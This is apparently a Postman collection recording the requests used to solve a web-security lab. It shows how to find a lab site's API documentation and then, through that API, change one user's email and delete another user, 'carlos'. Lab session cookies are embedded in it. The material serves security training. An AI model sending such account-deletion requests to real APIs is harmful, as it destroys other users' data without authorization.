@@ -1,0 +1,602 @@
+{
+	"info": {
+		"_postman_id": "2721b631-c172-4111-82f4-f974f6ca4045",
+		"name": "Lab: Exploiting an API endpoint using documentation",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "18053870"
+	},
+	"item": [
+		{
+			"name": "soln",
+			"item": [
+				{
+					"name": "1. find API docs",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net/api/",
+							"protocol": "https",
+							"host": [
+								"0a5300d503d8f79181fbb7f900a00065",
+								"web-security-academy",
+								"net"
+							],
+							"path": [
+								"api",
+								""
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "[401] user carlos w/o auth token",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "session=2a9ig1WYhyFj6HuIIk0tm7F33RL5GEnv",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/api/user/carlos",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"carlos"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[401] user carlos w/ session as wiener",
+			"request": {
+				"auth": {
+					"type": "bearer"
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "session=2a9ig1WYhyFj6HuIIk0tm7F33RL5GEnv",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}api/user/carlos",
+					"host": [
+						"{{base_url}}api"
+					],
+					"path": [
+						"user",
+						"carlos"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[401] carlos w/o auth token",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "DELETE",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "session=2a9ig1WYhyFj6HuIIk0tm7F33RL5GEnv",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/api/user/carlos",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"carlos"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[401] carlos w/ host,origin,referer,cookie",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "DELETE",
+				"header": [
+					{
+						"key": "host",
+						"value": " 0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "Origin",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "Referer",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net/my-account",
+						"type": "text"
+					},
+					{
+						"key": "Cookie",
+						"value": " session=2a9ig1WYhyFj6HuIIk0tm7F33RL5GEnvv",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "{{base_url}}/api/user/carlos",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"carlos"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[500] wiener change email, headers ZAP copypaste, no body",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "PATCH",
+				"header": [
+					{
+						"key": "host",
+						"value": " 0a1500d6041db8e483d7f1cb00f6000e.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Language",
+						"value": " en-US,en;q=0.5",
+						"type": "text"
+					},
+					{
+						"key": "Referer",
+						"value": " https://0a1500d6041db8e483d7f1cb00f6000e.web-security-academy.net/my-account",
+						"type": "text"
+					},
+					{
+						"key": "Content-Type",
+						"value": " text/plain;charset=UTF-8",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 29",
+						"type": "text"
+					},
+					{
+						"key": "Origin",
+						"value": " https://0a1500d6041db8e483d7f1cb00f6000e.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "DNT",
+						"value": " 1",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": " keep-alive",
+						"type": "text"
+					},
+					{
+						"key": "Cookie",
+						"value": " session=doOYno2Y9FKZyhZp9yW671jXJoDBEro0",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Dest",
+						"value": " empty",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Mode",
+						"value": " cors",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Site",
+						"value": " same-origin",
+						"type": "text"
+					},
+					{
+						"key": "Priority",
+						"value": " u=0",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"email\":\"aaaa1234@aaaa.com\"}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{base_url}}/api/user/wiener",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"wiener"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[401] wiener change email, modified headers ZAP copypaste w/ body",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "PATCH",
+				"header": [
+					{
+						"key": "host",
+						"value": " 0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Language",
+						"value": " en-US,en;q=0.5",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Referer",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net/my-account",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 34",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Origin",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "DNT",
+						"value": " 1",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Connection",
+						"value": " keep-alive",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Cookie",
+						"value": " session=lhlbF2elOsKqWQWKixt4tLQjCV7vOKr6",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Dest",
+						"value": " empty",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Sec-Fetch-Mode",
+						"value": " cors",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Sec-Fetch-Site",
+						"value": " same-origin",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "Priority",
+						"value": " u=0",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"email\":\"wiener@normal-user.net\"}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{base_url}}/api/user/wiener",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"wiener"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "[200] wiener change email 200s after lab reset",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "PATCH",
+				"header": [
+					{
+						"key": "host",
+						"value": " 0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Language",
+						"value": " en-US,en;q=0.5",
+						"type": "text"
+					},
+					{
+						"key": "Referer",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net/my-account",
+						"type": "text"
+					},
+					{
+						"key": "Content-Type",
+						"value": " text/plain;charset=UTF-8",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 34",
+						"type": "text"
+					},
+					{
+						"key": "Origin",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "DNT",
+						"value": " 1",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": " keep-alive",
+						"type": "text"
+					},
+					{
+						"key": "Cookie",
+						"value": " session=lhlbF2elOsKqWQWKixt4tLQjCV7vOKr6",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Dest",
+						"value": " empty",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Mode",
+						"value": " cors",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Site",
+						"value": " same-origin",
+						"type": "text"
+					},
+					{
+						"key": "Priority",
+						"value": " u=0",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{base_url}}/api/user/wiener",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"wiener"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "carlos",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "DELETE",
+				"header": [
+					{
+						"key": "host",
+						"value": " 0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "User-Agent",
+						"value": " Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+						"type": "text"
+					},
+					{
+						"key": "Accept",
+						"value": " */*",
+						"type": "text"
+					},
+					{
+						"key": "Accept-Language",
+						"value": " en-US,en;q=0.5",
+						"type": "text"
+					},
+					{
+						"key": "Referer",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net/my-account",
+						"type": "text"
+					},
+					{
+						"key": "Content-Type",
+						"value": " text/plain;charset=UTF-8",
+						"type": "text"
+					},
+					{
+						"key": "Content-Length",
+						"value": " 34",
+						"type": "text"
+					},
+					{
+						"key": "Origin",
+						"value": " https://0a5300d503d8f79181fbb7f900a00065.web-security-academy.net",
+						"type": "text"
+					},
+					{
+						"key": "DNT",
+						"value": " 1",
+						"type": "text"
+					},
+					{
+						"key": "Connection",
+						"value": " keep-alive",
+						"type": "text"
+					},
+					{
+						"key": "Cookie",
+						"value": " session=lhlbF2elOsKqWQWKixt4tLQjCV7vOKr6",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Dest",
+						"value": " empty",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Mode",
+						"value": " cors",
+						"type": "text"
+					},
+					{
+						"key": "Sec-Fetch-Site",
+						"value": " same-origin",
+						"type": "text"
+					},
+					{
+						"key": "Priority",
+						"value": " u=0",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{base_url}}/api/user/carlos",
+					"host": [
+						"{{base_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"carlos"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "",
+			"type": "default"
+		}
+	]
+}
